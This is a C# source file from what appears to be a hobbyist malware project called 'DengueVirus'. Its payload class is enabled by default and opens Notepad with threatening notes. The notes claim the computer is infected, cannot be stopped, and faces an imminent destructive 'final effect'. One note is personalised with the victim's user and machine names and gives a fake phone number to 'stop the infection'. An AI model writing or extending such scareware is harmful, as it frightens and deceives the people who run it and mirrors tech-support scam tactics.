using System;
using System.Diagnostics;
using System.IO;

namespace DengueVirus.Spicy
{
    class SpicyPL
    {

        // This is an class with Destructive/Kinda Malicious methods
        // Deleting this call will **NOT** affect the program's functionality

        // To disable the payloads, comment SPICY = true line below, or change it to false.

        public static bool SPICY = true;

        public static void WriteNote()
        {
            // Based on QuarkNova's Notepad payload, i kinda like it and
            // i think it fits well with the theme of this project.


            // Btw yeah theres some references to the original .txt note
            // but i guess it makes sense to keep it as a reference. ;)

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "Hi, im a mosquito, a mosquito that currently infected your computer.",
                Environment.NewLine,
                "As you may have noticed, Im too fast for any scan or taskkill.",
                Environment.NewLine,
                "You currently have only some minutes until my final effect get executed;",
                Environment.NewLine,
                "And trust me - Youre NOT gonna like the final one.",
                Environment.NewLine,Environment.NewLine,
                "- Devil Co., 2025" // should i put UltimateQ Co? Or it will be selfish?
            });
            File.WriteAllText("bsod_log.txt", contents);
            Process.Start("notepad.exe", "bsod_log.txt");
        }

        public static void UserNote()
        {
            // Based (again) on that Quarknova's notepad payload, but this time
            // it will open a notepad with a message FOR the user ;).

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "Hello, ", Environment.UserName, ", would you like to stop the infection?",
                Environment.NewLine,
                "If yes, call 0800-STOP-", Environment.MachineName, " and press ", Environment.OSVersion.Version.MajorRevision.ToString(), " while on the call.",
                Environment.NewLine,
                "You currently have only some minutes until my final effect get executed;",
                Environment.NewLine,
                "And trust me - Youre NOT gonna like the final one.",
                Environment.NewLine,Environment.NewLine,
                "- Devil Co., 2025" // should i put UltimateQ Co? Or it will be selfish?
            });
            File.WriteAllText("error_log.txt", contents);
            Process.Start("notepad.exe", "error_log.txt");
        }
    }
}
